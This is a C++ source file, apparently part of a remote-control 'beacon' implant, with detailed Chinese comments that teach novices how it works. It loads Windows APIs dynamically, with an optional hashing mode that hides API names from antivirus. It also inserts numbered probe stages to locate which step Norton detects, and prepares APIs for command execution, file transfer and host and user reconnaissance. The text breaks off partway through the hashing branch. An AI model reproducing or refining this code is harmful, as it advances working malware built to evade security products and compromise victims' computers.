// 文件作用：API 加载器实现：准备 WinAPI/NTAPI 函数指针表，让 agent 尽量不直接依赖导入表。
//
// 给小白看的整体说明：
// 1. Windows 程序想做事情，通常要调用系统 API，例如 Sleep、CreateFileA、GetUserNameA。
// 2. 普通程序会把这些 API 写进 PE 导入表，系统启动程序时自动帮它们绑定好。
// 3. 这个 agent 为了更灵活地裁剪功能、定位 AV 特征、减少固定导入表特征，
//    没有到处直接调用系统 API，而是先在 ApiLoad() 里把需要的 API 地址找出来，
//    存进 ApiWin / ApiNt 两张“函数指针表”。
// 4. 后面的 Agent、Commander、ConnectorHTTP 等模块就通过 ApiWin->Sleep、
//    ApiWin->CreateFileA、ApiNt->RtlExitUserThread 这种方式间接调用系统 API。
// 5. 文件里有两套解析方式：
//    - DIRECT_HTTPS_NO_API_HASHING=1：按明文函数名解析，方便实验和教学阅读。
//    - DIRECT_HTTPS_NO_API_HASHING=0：按 hash 解析模块/API，字符串更少，但更不直观。
// 6. DIRECT_HTTPS_PROBE_STAGE 70-78 是 Norton 查杀定位用的探针：
//    它们会让 ApiLoad() 执行到某个小步骤就直接返回，方便确认哪一段更敏感。
#include "ApiLoader.h"
#include "ProcLoader.h"

#ifndef DIRECT_HTTPS_SKIP_UNUSED_API_INIT
#define DIRECT_HTTPS_SKIP_UNUSED_API_INIT 0
#endif

#pragma intrinsic(memset)
#pragma function(memset)
// memset 是极简运行时里的内存填充函数，用来减少对标准 CRT 的依赖。
//
// 参数解释：
// - Destination：要填充的内存起始地址。
// - Value：要写进去的字节值，例如 0 表示清零。
// - Size：要写多少个字节。
//
// 为什么这里自己写 memset：
// - 当前 beacon 构建目标倾向于少依赖 C/C++ 标准运行库 CRT。
// - 如果使用编译器/CRT 默认 memset，PE 可能多出额外导入或运行时依赖。
// - 自己实现一个简单版本，可以让输出样本更可控，也方便做 AV 特征定位。
void* __cdecl memset(void* Destination, int Value, size_t Size)
{
	unsigned char* p = (unsigned char*)Destination;
	unsigned char val = (unsigned char)Value;
	
	// 当要填充的数据比较大时，先尽量按机器字大小写入，提高一点效率。
	// 这只是优化；最后仍会用逐字节循环处理剩余部分。
	if (Size >= sizeof(size_t)) {
		size_t pattern = val;
		for (size_t i = 1; i < sizeof(size_t); i++)
			pattern |= (pattern << 8);
		
		// 先把指针推进到对齐地址，这样后面的 size_t 写入更安全/更快。
		while (((size_t)p & (sizeof(size_t) - 1)) && Size) {
			*p++ = val;
			Size--;
		}
		// 大块按 size_t 写入。
		while (Size >= sizeof(size_t)) {
			*(size_t*)p = pattern;
			p += sizeof(size_t);
			Size -= sizeof(size_t);
		}
	}
	// 剩余几个字节逐字节写入。
	while (Size--)
		*p++ = val;
	
	return Destination;
}

#pragma intrinsic(memcpy)
#pragma function(memcpy)
// memcpy 是极简运行时里的内存复制函数，用来减少对标准 CRT 的依赖。
//
// 参数解释：
// - Dst：目标内存地址。
// - Src：源内存地址。
// - Size：复制多少个字节。
//
// 注意：
// - 这个函数假设源区域和目标区域不重叠，语义接近标准 memcpy。
// - 如果内存区域重叠，标准库里通常要用 memmove，但这里不实现 memmove。
void* __cdecl memcpy(void* Dst, const void* Src, size_t Size)
{
	unsigned char* d = (unsigned char*)Dst;
	const unsigned char* s = (const unsigned char*)Src;
	
	// 如果源地址和目标地址都满足机器字对齐，就按 size_t 块复制。
	// 这不是功能必需，只是让较大内存复制更快一点。
	if (Size >= sizeof(size_t) && (((size_t)d | (size_t)s) & (sizeof(size_t) - 1)) == 0) {
		while (Size >= sizeof(size_t)) {
			*(size_t*)d = *(const size_t*)s;
			d += sizeof(size_t);
			s += sizeof(size_t);
			Size -= sizeof(size_t);
		}
	}
	// 剩余部分逐字节复制。
	while (Size--)
		*d++ = *s++;
	
	return Dst;
}

// HdChrA 当前只是原样返回字符，作为以后隐藏/变换字符串的轻量占位。
// 例如下面 hash 模式里会用 HdChrA('A') 这种方式拼 "Advapi32.dll"。
// 现在它没有做混淆，只是保留一个统一入口，方便以后替换。
CHAR HdChrA(CHAR c) { return c; }
// HdChrW 当前只是原样返回宽字符，作为以后隐藏/变换字符串的轻量占位。
WCHAR HdChrW(WCHAR c) { return c; }

// SysModules 保存已经找到/加载的系统模块句柄，例如 kernel32.dll、ntdll.dll。
SYSMODULES* SysModules = NULL;
// ApiWin 保存 WinAPI 函数指针，例如 Sleep、CreateFileA、LoadLibraryA。
WINAPIFUNC* ApiWin     = NULL;
// ApiNt 保存 NTAPI 函数指针，例如 NtClose、RtlExitUserProcess。
NTAPIFUNC*  ApiNt      = NULL;
// ApiLoadProbeCode 是 AV 定位实验用的返回码。
// MainAgent.cpp 会读取它，让样本执行到指定初始化阶段后返回 1370-1378 等退出码。
DWORD       ApiLoadProbeCode = 0;

#if DIRECT_HTTPS_NO_API_HASHING

// ResolveByName 用普通 GetProcAddress 根据函数名取地址。
//
// 小白理解：
// - module 是某个 DLL 的句柄，例如 kernel32.dll。
// - name 是要找的函数名，例如 "Sleep"。
// - GetProcAddress 会返回这个函数在当前进程里的真实地址。
// - 返回值 FARPROC 本质上就是一个“函数地址”。
static FARPROC ResolveByName(HMODULE module, LPCSTR name)
{
	if (!module || !name)
		return NULL;
	return GetProcAddress(module, name);
}

// ModuleByName 先尝试获取已加载模块，找不到时再 LoadLibraryA 加载。
//
// 小白理解：
// - GetModuleHandleA(name)：问系统“这个 DLL 现在是否已经在进程里加载了？”
// - LoadLibraryA(name)：如果还没加载，就主动把这个 DLL 加载进来。
// - 这样后面才能从 DLL 里找函数地址。
//
// 在 DIRECT_HTTPS_SKIP_UNUSED_API_INIT=1 的当前实验构建里，这个帮助函数也会被屏蔽，
// 因为我们不再保存/使用 GetModuleHandleA 指针，kernel32.dll 直接用 LoadLibraryA 取得。
#if !DIRECT_HTTPS_SKIP_UNUSED_API_INIT
static HMODULE ModuleByName(LPCSTR name)
{
	HMODULE module = GetModuleHandleA(name);
	if (!module)
		module = LoadLibraryA(name);
	return module;
}
#endif

// ApiLoad 初始化全局 API 表；agent 后续通过 ApiWin/ApiNt 调 WinAPI/NTAPI。
//
// 当前 direct_https_agent 的 active 构建通常走这个 DIRECT_HTTPS_NO_API_HASHING 分支，
// 因为 src_beacon/Makefile 里定义了：
//   -D DIRECT_HTTPS_NO_API_HASHING=1
//   -D DIRECT_HTTPS_MINIMAL_IDENTITY=1
//   -D DIRECT_HTTPS_CHECKIN_ONLY=1
//
// 所以对你当前 Norton 定位实验来说，最关键的是这个分支。
//
// ApiLoad() 的大步骤：
// 1. 找到 kernel32.dll。
// 2. 分配三张表：SysModules、ApiWin、ApiNt。
// 3. 把 kernel32.dll 句柄记进 SysModules。
// 4. 填充最基础的 API 指针，例如 LoadLibraryA、GetProcAddress、LocalAlloc。
// 5. 按编译开关决定是否解析文件/进程命令相关 API。
// 6. 在 MINIMAL_IDENTITY 模式下，只解析 check-in/基础身份所需的最小 API。
// 7. 找到 ntdll.dll，解析 RtlExitUserThread / RtlExitUserProcess。
// 8. 最后检查必要函数是否都成功解析，成功返回 TRUE，失败返回 FALSE。
BOOL ApiLoad()
{
	// 第一步：找到 kernel32.dll。
	// kernel32.dll 是 Windows 用户态程序最常用的基础 DLL，里面有：
	// LoadLibraryA、GetProcAddress、LocalAlloc、Sleep、HeapAlloc 等。
#if DIRECT_HTTPS_SKIP_UNUSED_API_INIT
	HMODULE hKernel32Module = LoadLibraryA("kernel32.dll");
#else
	HMODULE hKernel32Module = ModuleByName("kernel32.dll");
#endif
	if (!hKernel32Module)
		return FALSE;

	// Probe stage 70：
	// 只确认 kernel32.dll 能拿到，然后直接返回。
	// 用于回答“仅获取 kernel32 模块是否就触发 AV”。
#if DIRECT_HTTPS_PROBE_STAGE == 70
	ApiLoadProbeCode = 1370;
	return TRUE;
#endif

	// 第二步：分配 SysModules。
	// SysModules 是一个结构体，用来保存 kernel32/ntdll/iphlpapi/advapi32 等模块句柄。
	SysModules = (SYSMODULES*) LocalAlloc(LPTR, sizeof(SYSMODULES));
	// Probe stage 71：
	// 只做到 SysModules 分配后返回。
	// 如果这里被拦，说明极早期内存分配/结构体形态可能参与检测。
#if DIRECT_HTTPS_PROBE_STAGE == 71
	ApiLoadProbeCode = SysModules ? 1371 : 1471;
	return TRUE;
#endif

	// 第三步：分配 ApiWin。
	// ApiWin 是一张 WinAPI 函数指针表，后续大多数 Windows API 都从这里间接调用。
	ApiWin     = (WINAPIFUNC*) LocalAlloc(LPTR, sizeof(WINAPIFUNC));
	// Probe stage 72：
	// 只做到 ApiWin 表分配后返回。
#if DIRECT_HTTPS_PROBE_STAGE == 72
	ApiLoadProbeCode = ApiWin ? 1372 : 1472;
	return TRUE;
#endif

	// 第四步：分配 ApiNt。
	// ApiNt 是一张 NTAPI 函数指针表，保存 ntdll.dll 里的底层函数。
	// 例如 RtlExitUserProcess、NtQuerySystemInformation。
	ApiNt      = (NTAPIFUNC*)  LocalAlloc(LPTR, sizeof(NTAPIFUNC));
	// Probe stage 73：
	// 只做到 ApiNt 表分配后返回。
	// 这是最近 Norton 定位里重点复测过的位置。
#if DIRECT_HTTPS_PROBE_STAGE == 73
	ApiLoadProbeCode = ApiNt ? 1373 : 1473;
	return TRUE;
#endif

	// 任意一张表分配失败，后面都不能安全使用，所以直接失败。
	if (!SysModules || !ApiWin || !ApiNt)
		return FALSE;

	// 第五步：记录 kernel32.dll 模块句柄，方便后续其他模块复用。
	SysModules->Kernel32 = hKernel32Module;
	// Probe stage 74：
	// 只做到 SysModules->Kernel32 赋值后返回。
#if DIRECT_HTTPS_PROBE_STAGE == 74
	ApiLoadProbeCode = 1374;
	return TRUE;
#endif

	// 第六步：先把最基础、最可靠的 API 指针直接写进 ApiWin。
	// 这些函数当前编译单元可以直接引用，所以不用 ResolveByName。
	//
	// 它们的作用：
	// - LoadLibraryA：后面加载 iphlpapi.dll、advapi32.dll、ntdll.dll 等。
	// - GetProcAddress：根据函数名找 API 地址。
	// - GetModuleHandleA：判断某个 DLL 是否已经加载。
	// - LocalAlloc/LocalFree/LocalReAlloc：分配/释放/调整本地内存。
	// - GetLastError：拿 Windows API 失败原因。
	ApiWin->LoadLibraryA              = LoadLibraryA;
	ApiWin->GetProcAddress            = GetProcAddress;
#if !DIRECT_HTTPS_SKIP_UNUSED_API_INIT
	ApiWin->GetModuleHandleA          = GetModuleHandleA;
#endif
	ApiWin->LocalAlloc                = LocalAlloc;
	ApiWin->LocalFree                 = LocalFree;
	ApiWin->LocalReAlloc              = LocalReAlloc;
	ApiWin->GetLastError              = GetLastError;
	// Probe stage 75：
	// 确认核心 API 指针都写好了就返回。
#if DIRECT_HTTPS_PROBE_STAGE == 75
	ApiLoadProbeCode = ApiWin->LoadLibraryA &&
	                   ApiWin->GetProcAddress &&
#if !DIRECT_HTTPS_SKIP_UNUSED_API_INIT
	                   ApiWin->GetModuleHandleA &&
#endif
	                   ApiWin->LocalAlloc &&
	                   ApiWin->LocalFree &&
	                   ApiWin->LocalReAlloc &&
	                   ApiWin->GetLastError ? 1375 : 1475;
	return TRUE;
#endif

	// 如果不是 check-in-only 模式，就解析完整文件/进程能力所需 API。
	//
	// 这些 API 对应的功能大概是：
	// - CopyFileA / MoveFileA / DeleteFileA / RemoveDirectoryA：文件复制、移动、删除、删目录。
	// - CreateDirectoryA：mkdir。
	// - CreateFileA / ReadFile / WriteFile / GetFileSize：文件读写、upload/download/cat。
	// - FindFirstFileA / FindNextFileA / FindClose：ls 目录枚举。
	// - CreatePipe / CreateProcessA / PeekNamedPipe / GetExitCodeProcess：cmd/powershell 子进程执行和输出捕获。
	// - GetCurrentDirectoryA / SetCurrentDirectoryA / GetFullPathNameA：pwd/cd/path 处理。
	//
	// 当前你的最小化/Norton 定位构建一般打开 DIRECT_HTTPS_CHECKIN_ONLY，
	// 所以这块通常会被编译器排除，不进入当前测试样本。
#if !DIRECT_HTTPS_CHECKIN_ONLY
	ApiWin->CopyFileA                 = (decltype(CopyFileA)*)                 ResolveByName(hKernel32Module, "CopyFileA");
	ApiWin->CreateDirectoryA          = (decltype(CreateDirectoryA)*)          ResolveByName(hKernel32Module, "CreateDirectoryA");
	ApiWin->CreateFileA               = (decltype(CreateFileA)*)               ResolveByName(hKernel32Module, "CreateFileA");
	ApiWin->CreatePipe                = (decltype(CreatePipe)*)                ResolveByName(hKernel32Module, "CreatePipe");
	ApiWin->CreateProcessA            = (decltype(CreateProcessA)*)            ResolveByName(hKernel32Module, "CreateProcessA");
	ApiWin->DeleteFileA               = (decltype(DeleteFileA)*)               ResolveByName(hKernel32Module, "DeleteFileA");
	ApiWin->GetExitCodeProcess        = (decltype(GetExitCodeProcess)*)        ResolveByName(hKernel32Module, "GetExitCodeProcess");
	ApiWin->FindClose                 = (decltype(FindClose)*)                 ResolveByName(hKernel32Module, "FindClose");
	ApiWin->FindFirstFileA            = (decltype(FindFirstFileA)*)            ResolveByName(hKernel32Module, "FindFirstFileA");
	ApiWin->FindNextFileA             = (decltype(FindNextFileA)*)             ResolveByName(hKernel32Module, "FindNextFileA");
	ApiWin->GetCurrentDirectoryA      = (decltype(GetCurrentDirectoryA)*)      ResolveByName(hKernel32Module, "GetCurrentDirectoryA");
	ApiWin->GetDriveTypeA             = (decltype(GetDriveTypeA)*)             ResolveByName(hKernel32Module, "GetDriveTypeA");
	ApiWin->GetFileSize               = (decltype(GetFileSize)*)               ResolveByName(hKernel32Module, "GetFileSize");
	ApiWin->GetFileAttributesA        = (decltype(GetFileAttributesA)*)        ResolveByName(hKernel32Module, "GetFileAttributesA");
	ApiWin->GetFullPathNameA          = (decltype(GetFullPathNameA)*)          ResolveByName(hKernel32Module, "GetFullPathNameA");
	ApiWin->GetLogicalDrives          = (decltype(GetLogicalDrives)*)          ResolveByName(hKernel32Module, "GetLogicalDrives");
	ApiWin->MoveFileA                 = (decltype(MoveFileA)*)                 ResolveByName(hKernel32Module, "MoveFileA");
	ApiWin->PeekNamedPipe             = (decltype(PeekNamedPipe)*)             ResolveByName(hKernel32Module, "PeekNamedPipe");
	ApiWin->ReadFile                  = (decltype(ReadFile)*)                  ResolveByName(hKernel32Module, "ReadFile");
	ApiWin->RemoveDirectoryA          = (decltype(RemoveDirectoryA)*)          ResolveByName(hKernel32Module, "RemoveDirectoryA");
	ApiWin->SetCurrentDirectoryA      = (decltype(SetCurrentDirectoryA)*)      ResolveByName(hKernel32Module, "SetCurrentDirectoryA");
	ApiWin->WriteFile                 = (decltype(WriteFile)*)                 ResolveByName(hKernel32Module, "WriteFile");
#endif

	// DIRECT_HTTPS_MINIMAL_IDENTITY 模式：
	// 只保留最小 check-in/基础运行需要的 API。
	// 这条分支是当前定位实验的重点，因为它尽量排除了 cmd、powershell、文件传输等后置功能。
#if DIRECT_HTTPS_MINIMAL_IDENTITY
	// 这些 kernel32 API 的作用：
	// - GetLocalTime / GetSystemTimeAsFileTime / GetTickCount：时间、随机种子、心跳/基础信息。
	// - HeapAlloc / HeapCreate / HeapDestroy / HeapReAlloc / HeapFree：agent 自己的堆内存管理。
	// - Sleep：beacon sleep、probe sleep、循环等待。
#if !DIRECT_HTTPS_SKIP_UNUSED_API_INIT
	ApiWin->GetLocalTime              = (decltype(GetLocalTime)*)              ResolveByName(hKernel32Module, "GetLocalTime");
	ApiWin->GetSystemTimeAsFileTime   = (decltype(GetSystemTimeAsFileTime)*)   ResolveByName(hKernel32Module, "GetSystemTimeAsFileTime");
#endif
	ApiWin->GetTickCount              = (decltype(GetTickCount)*)              ResolveByName(hKernel32Module, "GetTickCount");
	ApiWin->HeapAlloc                 = (decltype(HeapAlloc)*)                 ResolveByName(hKernel32Module, "HeapAlloc");
	ApiWin->HeapCreate                = (decltype(HeapCreate)*)                ResolveByName(hKernel32Module, "HeapCreate");
	ApiWin->HeapDestroy               = (decltype(HeapDestroy)*)               ResolveByName(hKernel32Module, "HeapDestroy");
#if !DIRECT_HTTPS_SKIP_UNUSED_API_INIT
	ApiWin->HeapReAlloc               = (decltype(HeapReAlloc)*)               ResolveByName(hKernel32Module, "HeapReAlloc");
#endif
	ApiWin->HeapFree                  = (decltype(HeapFree)*)                  ResolveByName(hKernel32Module, "HeapFree");
	ApiWin->Sleep                     = (decltype(Sleep)*)                     ResolveByName(hKernel32Module, "Sleep");
	// Probe stage 76：
	// 只做到 minimal identity 所需 kernel32 API 解析完成。
	// 如果这里失败返回 1476，说明至少有一个函数没解析到。
#if DIRECT_HTTPS_PROBE_STAGE == 76
	ApiLoadProbeCode =
#if !DIRECT_HTTPS_SKIP_UNUSED_API_INIT
	                   ApiWin->GetLocalTime &&
	                   ApiWin->GetSystemTimeAsFileTime &&
#endif
	                   ApiWin->GetTickCount &&
	                   ApiWin->HeapAlloc &&
	                   ApiWin->HeapCreate &&
	                   ApiWin->HeapDestroy &&
#if !DIRECT_HTTPS_SKIP_UNUSED_API_INIT
	                   ApiWin->HeapReAlloc &&
#endif
	                   ApiWin->HeapFree &&
	                   ApiWin->Sleep ? 1376 : 1476;
	return TRUE;
#endif

#if DIRECT_HTTPS_SKIP_UNUSED_API_INIT
	// “未用 API 不初始化”实验模式：
	// 当前 minimal/check-in-only 样本不使用 ntdll 表里的退出函数。
	// AgentExit() 在这个模式下改成自然返回，因此这里完全跳过：
	// - ModuleByName("ntdll.dll")
	// - ResolveByName("RtlExitUserThread")
	// - ResolveByName("RtlExitUserProcess")
	//
	// 这正好验证老师建议的方向：把暂时不用的初始化面收掉，
	// 看 Norton 是否还会在 ApiLoad() 末端或 ntdll/Rtl 解析附近拦截。
#if DIRECT_HTTPS_PROBE_STAGE == 77
	ApiLoadProbeCode = 1377;
	return TRUE;
#endif
#if DIRECT_HTTPS_PROBE_STAGE == 78
	ApiLoadProbeCode = 1378;
	return TRUE;
#endif
	return ApiWin->GetTickCount &&
	       ApiWin->HeapAlloc &&
	       ApiWin->HeapCreate &&
	       ApiWin->HeapDestroy &&
	       ApiWin->HeapFree &&
	       ApiWin->Sleep;
#else
	// 第七步：找到 ntdll.dll。
	// ntdll.dll 提供更底层的 NTAPI / RTL API。
	HMODULE hNtdllModule = ModuleByName("ntdll.dll");
	SysModules->Ntdll = hNtdllModule;
	if (!hNtdllModule)
		return FALSE;
	// Probe stage 77：
	// 只做到 ntdll.dll 模块句柄获取成功。
#if DIRECT_HTTPS_PROBE_STAGE == 77
	ApiLoadProbeCode = 1377;
	return TRUE;
#endif

	// 第八步：解析两个退出相关的 ntdll 函数。
	// - RtlExitUserThread：结束当前线程。
	// - RtlExitUserProcess：结束整个进程。
	//
	// 这两个函数后续用于 agent 退出/自清理路径，比直接 ExitProcess 更贴近 ntdll 层。
	ApiNt->RtlExitUserThread  = (decltype(RtlExitUserThread)*)  ResolveByName(hNtdllModule, "RtlExitUserThread");
	ApiNt->RtlExitUserProcess = (decltype(RtlExitUserProcess)*) ResolveByName(hNtdllModule, "RtlExitUserProcess");

	// Probe stage 78：
	// 只做到 RtlExitUserThread/RtlExitUserProcess 解析完成。
	// 最近测试中，这个 stage 在 Norton 下出现过稳定 AccessDenied，但 Chest 无新增。
#if DIRECT_HTTPS_PROBE_STAGE == 78
	ApiLoadProbeCode = ApiNt->RtlExitUserThread &&
	                   ApiNt->RtlExitUserProcess ? 1378 : 1478;
	return TRUE;
#endif

	// minimal identity 模式的最终健康检查：
	// 所有必要函数指针都非空，才认为 ApiLoad 成功。
	return ApiWin->GetLocalTime &&
	       ApiWin->GetSystemTimeAsFileTime &&
	       ApiWin->GetTickCount &&
	       ApiWin->HeapAlloc &&
	       ApiWin->HeapCreate &&
	       ApiWin->HeapDestroy &&
	       ApiWin->HeapReAlloc &&
	       ApiWin->HeapFree &&
	       ApiWin->Sleep &&
	       ApiNt->RtlExitUserThread &&
	       ApiNt->RtlExitUserProcess;
#endif
#else
	// 非 minimal identity 模式：
	// 解析完整身份采集和完整 agent 运行需要的 API。
	// 这条分支比 minimal 模式功能更多，也更接近原始完整样本。
	//
	// 下面这些 kernel32 API 主要用于：
	// - 获取主机名、代码页、时区、系统时间。
	// - 判断 32/64 位环境。
	// - 管理堆内存。
	// - 获取当前进程模块名。
	ApiWin->GetACP                    = (decltype(GetACP)*)                    ResolveByName(hKernel32Module, "GetACP");
	ApiWin->GetComputerNameExA        = (decltype(GetComputerNameExA)*)        ResolveByName(hKernel32Module, "GetComputerNameExA");
	ApiWin->GetOEMCP                  = (decltype(GetOEMCP)*)                  ResolveByName(hKernel32Module, "GetOEMCP");
	ApiWin->GetModuleBaseNameA        = (decltype(GetModuleBaseNameA)*)        ResolveByName(hKernel32Module, "K32GetModuleBaseNameA");
	ApiWin->GetLocalTime              = (decltype(GetLocalTime)*)              ResolveByName(hKernel32Module, "GetLocalTime");
	ApiWin->GetSystemTimeAsFileTime   = (decltype(GetSystemTimeAsFileTime)*)   ResolveByName(hKernel32Module, "GetSystemTimeAsFileTime");
	ApiWin->GetTickCount              = (decltype(GetTickCount)*)              ResolveByName(hKernel32Module, "GetTickCount");
	ApiWin->GetTimeZoneInformation    = (decltype(GetTimeZoneInformation)*)    ResolveByName(hKernel32Module, "GetTimeZoneInformation");
	ApiWin->HeapAlloc                 = (decltype(HeapAlloc)*)                 ResolveByName(hKernel32Module, "HeapAlloc");
	ApiWin->HeapCreate                = (decltype(HeapCreate)*)                ResolveByName(hKernel32Module, "HeapCreate");
	ApiWin->HeapDestroy               = (decltype(HeapDestroy)*)               ResolveByName(hKernel32Module, "HeapDestroy");
	ApiWin->HeapReAlloc               = (decltype(HeapReAlloc)*)               ResolveByName(hKernel32Module, "HeapReAlloc");
	ApiWin->HeapFree                  = (decltype(HeapFree)*)                  ResolveByName(hKernel32Module, "HeapFree");
	ApiWin->IsWow64Process            = (decltype(IsWow64Process)*)            ResolveByName(hKernel32Module, "IsWow64Process");
	ApiWin->Sleep                     = (decltype(Sleep)*)                     ResolveByName(hKernel32Module, "Sleep");

	// K32GetModuleBaseNameA 在某些系统上可能不从 kernel32 直接解析到。
	// 如果失败，就尝试加载 psapi.dll，再从 psapi.dll 找 GetModuleBaseNameA。
	if (!ApiWin->GetModuleBaseNameA) {
		HMODULE hPsapiModule = ModuleByName("psapi.dll");
		if (hPsapiModule)
			ApiWin->GetModuleBaseNameA = (decltype(GetModuleBaseNameA)*) ResolveByName(hPsapiModule, "GetModuleBaseNameA");
	}

	// iphlpapi.dll 用于网络适配器信息采集。
	// GetAdaptersInfo 可以拿到网卡、IP 等基础网络信息。
	HMODULE hIphlpapiModule = ModuleByName("iphlpapi.dll");
	SysModules->Iphlpapi = hIphlpapiModule;
	if (hIphlpapiModule)
		ApiWin->GetAdaptersInfo = (decltype(GetAdaptersInfo)*) ResolveByName(hIphlpapiModule, "GetAdaptersInfo");

	// advapi32.dll 用于用户/令牌相关信息采集。
	// GetTokenInformation：拿 token 权限/完整性等信息。
	// GetUserNameA：拿当前用户名。
	HMODULE hAdvapi32Module = ModuleByName("advapi32.dll");
	SysModules->Advapi32 = hAdvapi32Module;
	if (hAdvapi32Module) {
		ApiWin->GetTokenInformation = (decltype(GetTokenInformation)*) ResolveByName(hAdvapi32Module, "GetTokenInformation");
		ApiWin->GetUserNameA        = (decltype(GetUserNameA)*)        ResolveByName(hAdvapi32Module, "GetUserNameA");
	}

	// ntdll.dll：解析底层 NTAPI / RTL API。
	HMODULE hNtdllModule = ModuleByName("ntdll.dll");
	SysModules->Ntdll = hNtdllModule;
	if (!hNtdllModule)
		return FALSE;

	// 这些 NTAPI/RTL API 的作用：
	// - NtClose：关闭内核对象句柄。
	// - NtQuerySystemInformation：查询系统进程/系统信息。
	// - NtOpenProcessToken：打开进程 token。
	// - NtTerminateProcess：结束进程。
	// - RtlGetVersion：获取 Windows 版本。
	// - RtlExitUserThread / RtlExitUserProcess：退出线程/进程。
	// - RtlIpv4StringToAddressA：把 IPv4 字符串转成地址结构。
	// - RtlRandomEx：生成伪随机数。
	// - RtlNtStatusToDosError：把 NTSTATUS 错误码转成 Win32 错误码。
	ApiNt->NtClose                  = (decltype(NtClose)*)                  ResolveByName(hNtdllModule, "NtClose");
	ApiNt->NtQuerySystemInformation = (decltype(NtQuerySystemInformation)*) ResolveByName(hNtdllModule, "NtQuerySystemInformation");
	ApiNt->NtOpenProcessToken       = (decltype(NtOpenProcessToken)*)       ResolveByName(hNtdllModule, "NtOpenProcessToken");
	ApiNt->NtTerminateProcess       = (decltype(NtTerminateProcess)*)       ResolveByName(hNtdllModule, "NtTerminateProcess");
	ApiNt->RtlGetVersion            = (decltype(RtlGetVersion)*)            ResolveByName(hNtdllModule, "RtlGetVersion");
	ApiNt->RtlExitUserThread        = (decltype(RtlExitUserThread)*)        ResolveByName(hNtdllModule, "RtlExitUserThread");
	ApiNt->RtlExitUserProcess       = (decltype(RtlExitUserProcess)*)       ResolveByName(hNtdllModule, "RtlExitUserProcess");
	ApiNt->RtlIpv4StringToAddressA  = (decltype(RtlIpv4StringToAddressA)*)  ResolveByName(hNtdllModule, "RtlIpv4StringToAddressA");
	ApiNt->RtlRandomEx              = (decltype(RtlRandomEx)*)              ResolveByName(hNtdllModule, "RtlRandomEx");
	ApiNt->RtlNtStatusToDosError    = (decltype(RtlNtStatusToDosError)*)    ResolveByName(hNtdllModule, "RtlNtStatusToDosError");

	// 完整身份模式的最终健康检查：
	// 只要关键函数里有任何一个没解析出来，就返回 FALSE。
	return ApiWin->GetACP &&
	       ApiWin->GetComputerNameExA &&
	       ApiWin->GetModuleBaseNameA &&
	       ApiWin->GetLocalTime &&
	       ApiWin->GetSystemTimeAsFileTime &&
	       ApiWin->GetTickCount &&
	       ApiWin->GetTimeZoneInformation &&
	       ApiWin->IsWow64Process &&
	       ApiWin->Sleep &&
	       ApiWin->GetAdaptersInfo &&
	       ApiWin->GetTokenInformation &&
	       ApiWin->GetUserNameA &&
	       ApiNt->NtClose &&
	       ApiNt->NtQuerySystemInformation &&
	       ApiNt->NtOpenProcessToken &&
	       ApiNt->RtlGetVersion &&
	       ApiNt->RtlExitUserThread &&
	       ApiNt->RtlExitUserProcess &&
	       ApiNt->RtlIpv4StringToAddressA &&
	       ApiNt->RtlRandomEx &&
	       ApiNt->RtlNtStatusToDosError;
#endif
}

#else

// 这个分支是“hash 解析模式”：
// - 不直接写 "kernel32.dll"、"Sleep" 这种明文名字。
// - 而是用 HASH_LIB_KERNEL32、HASH_FUNC_SLEEP 等 hash 常量。
// - GetModuleAddress / GetSymbolAddress 在 ProcLoader.cpp 里实现，
//   通常会遍历进程模块列表和导出表来找 DLL/API。
//
// 小白理解：
// - 明文模式像“按名字查电话簿”。
// - hash 模式像“先把名字算成编号，再按编号查电话簿”。
// - 好处是字符串少；坏处是阅读困难，也可能引入另一类 AV 特征。
BOOL ApiLoad()
{
	// 通过 hash 找 kernel32.dll 的模块地址。
	HMODULE hKernel32Module = GetModuleAddress(HASH_LIB_KERNEL32);

	// 先找到 LocalAlloc，因为后面要靠它分配三张全局表。
	decltype(LocalAlloc)* allocProc = (decltype(LocalAlloc)*) GetSymbolAddress(hKernel32Module, HASH_FUNC_LOCALALLOC);

	// 分配模块表、WinAPI 表、NTAPI 表。
	SysModules = (SYSMODULES*) allocProc(LPTR, sizeof(SYSMODULES));
	ApiWin     = (WINAPIFUNC*) allocProc(LPTR, sizeof(WINAPIFUNC));
	ApiNt      = (NTAPIFUNC*)  allocProc(LPTR, sizeof(NTAPIFUNC));

	// 记录 kernel32.dll 模块句柄。
	SysModules->Kernel32 = hKernel32Module;

	if ( ApiWin && hKernel32Module) {
		// kernel32 基础 API：
		// 这里全部通过 hash 常量解析函数地址，然后写进 ApiWin。
		ApiWin->LoadLibraryA = (decltype(LoadLibraryA)*)GetSymbolAddress(hKernel32Module, HASH_FUNC_LOADLIBRARYA);

		// 非 check-in-only 模式才需要文件、目录、子进程相关 API。
#if !DIRECT_HTTPS_CHECKIN_ONLY
		ApiWin->CopyFileA				= (decltype(CopyFileA)*)			   GetSymbolAddress(hKernel32Module, HASH_FUNC_COPYFILEA);
		ApiWin->CreateDirectoryA		= (decltype(CreateDirectoryA)*)		   GetSymbolAddress(hKernel32Module, HASH_FUNC_CREATEDIRECTORYA);
		ApiWin->CreateFileA				= (decltype(CreateFileA)*)			   GetSymbolAddress(hKernel32Module, HASH_FUNC_CREATEFILEA);
		ApiWin->CreatePipe				= (decltype(CreatePipe)*)			   GetSymbolAddress(hKernel32Module, HASH_FUNC_CREATEPIPE);
		ApiWin->CreateProcessA			= (decltype(CreateProcessA)*)		   GetSymbolAddress(hKernel32Module, HASH_FUNC_CREATEPROCESSA);
		ApiWin->DeleteFileA				= (decltype(DeleteFileA)*)			   GetSymbolAddress(hKernel32Module, HASH_FUNC_DELETEFILEA);
		ApiWin->GetExitCodeProcess		= (decltype(GetExitCodeProcess)*)	   GetSymbolAddress(hKernel32Module, HASH_FUNC_GETEXITCODEPROCESS);
		ApiWin->FindClose				= (decltype(FindClose)*)			   GetSymbolAddress(hKernel32Module, HASH_FUNC_FINDCLOSE);
		ApiWin->FindFirstFileA			= (decltype(FindFirstFileA)*)		   GetSymbolAddress(hKernel32Module, HASH_FUNC_FINDFIRSTFILEA);
		ApiWin->FindNextFileA			= (decltype(FindNextFileA)*)		   GetSymbolAddress(hKernel32Module, HASH_FUNC_FINDNEXTFILEA);
#endif
		// 身份采集/基础运行 API。
		ApiWin->GetACP					= (decltype(GetACP)*)				   GetSymbolAddress(hKernel32Module, HASH_FUNC_GETACP);
		ApiWin->GetComputerNameExA		= (decltype(GetComputerNameExA)*)	   GetSymbolAddress(hKernel32Module, HASH_FUNC_GETCOMPUTERNAMEEXA);
#if !DIRECT_HTTPS_CHECKIN_ONLY
		ApiWin->GetCurrentDirectoryA	= (decltype(GetCurrentDirectoryA)*)	   GetSymbolAddress(hKernel32Module, HASH_FUNC_GETCURRENTDIRECTORYA);
